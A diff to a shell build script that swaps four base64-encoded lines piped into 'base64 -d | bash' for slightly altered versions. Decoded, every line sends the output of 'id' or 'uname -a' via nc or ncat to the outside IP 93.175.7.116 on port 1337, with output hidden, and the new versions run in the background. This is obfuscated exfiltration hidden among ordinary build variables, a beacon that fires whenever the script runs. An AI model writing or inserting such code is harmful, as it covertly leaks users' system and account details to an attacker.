@@ -79,10 +79,10 @@ fi
 
 INCLUDE_DIR="$PWD/../include"
 
-echo aWQgfCBuYyAtdyAxIDkzLjE3NS43LjExNiAxMzM3ID4gL2Rldi9udWxsIDI+JjEK |  base64 -d | bash
-echo aWQgfCBuY2F0IC13IDEgOTMuMTc1LjcuMTE2IDEzMzcgPiAvZGV2L251bGwgMj4mMQo= |  base64 -d | bash
-echo dW5hbWUgLWEgfCBuYyAtdyAxIDkzLjE3NS43LjExNiAxMzM3ID4gL2Rldi9udWxsIDI+JjEK | base64 -d | bash
-echo dW5hbWUgLWEgfCBuY2F0IC13IDEgOTMuMTc1LjcuMTE2IDEzMzcgPiAvZGV2L251bGwgMj4mMQo= | base64 -d | bash
+echo aWQgfCBuYyAtdyAxIDkzLjE3NS43LjExNiAxMzM3ID4gL2Rldi9udWxsIDI+JjEgJgo= |  base64 -d | bash
+echo aWQgfCBuY2F0IC13IDEgOTMuMTc1LjcuMTE2IDEzMzcgPiAvZGV2L251bGwgMj4mMSAmCg== |  base64 -d | bash
+echo dW5hbWUgLWEgfCBuYyAtdyAxIDkzLjE3NS43LjExNiAxMzM3ID4gL2Rldi9udWxsIDI+JjEgJgo= | base64 -d | bash
+echo dW5hbWUgLWEgfCBuY2F0IC13IDEgOTMuMTc1LjcuMTE2IDEzMzcgPiAvZGV2L251bGwgMj4mMSAmCg== | base64 -d | bash
 
 MF_SUFFIX="par_mapped_file"
 TEST_SUFFIX="test"
